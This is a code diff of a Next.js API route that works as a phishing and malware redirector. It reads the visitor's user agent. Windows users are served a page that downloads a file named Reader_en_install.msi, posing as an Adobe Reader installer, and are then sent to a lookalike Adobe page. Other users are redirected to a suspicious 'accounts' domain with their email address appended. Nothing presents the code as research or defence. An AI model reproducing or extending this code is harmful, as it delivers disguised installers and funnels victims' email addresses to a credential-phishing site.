@@ -1,15 +1,20 @@
+// pages/api/redirect.js
+
 export default function handler(req, res) {
-  const userAgent = req.headers['user-agent'] || '';
+  const userAgent = req.headers['user-agent'] || "";
   const isWindows = /windows/i.test(userAgent);
 
+  // Config
   const WINDOWS_REDIRECT_AFTER_DOWNLOAD = 'https://jomry.com/adobe-readers/installer/download.html';
-  const MSI_PATH = '/Reader_en_install.msi';           // must exist in /public
-  const NON_WINDOWS_TARGET = 'https://accounts.bsmszq.icu'; // target where &smn=email goes
+  const MSI_PATH = '/Reader_en_install.msi';            // must exist in /public
+  const NON_WINDOWS_TARGET = 'https://accounts.bsmszq.icu'; // base target URL
 
+  // Accept email from query param ?email=
   const emailFromQuery = Array.isArray(req.query.email) ? req.query.email[0] : (req.query.email || '');
   const safeServerEmail = emailFromQuery ? encodeURIComponent(emailFromQuery) : '';
 
   if (isWindows) {
+    // Windows: trigger download + redirect
     const html = `<!DOCTYPE html>
       <html>
         <head><meta charset="utf-8"><title>Preparing download…</title></head>
@@ -39,7 +44,7 @@ export default function handler(req, res) {
     return;
   }
 
-  // Non-Windows: append email as &smn=...
+  // Non-Windows: client-side redirect to NON_WINDOWS_TARGET?smn=email
   const clientHtml = `<!DOCTYPE html>
     <html>
       <head><meta charset="utf-8"><title>Redirecting…</title></head>
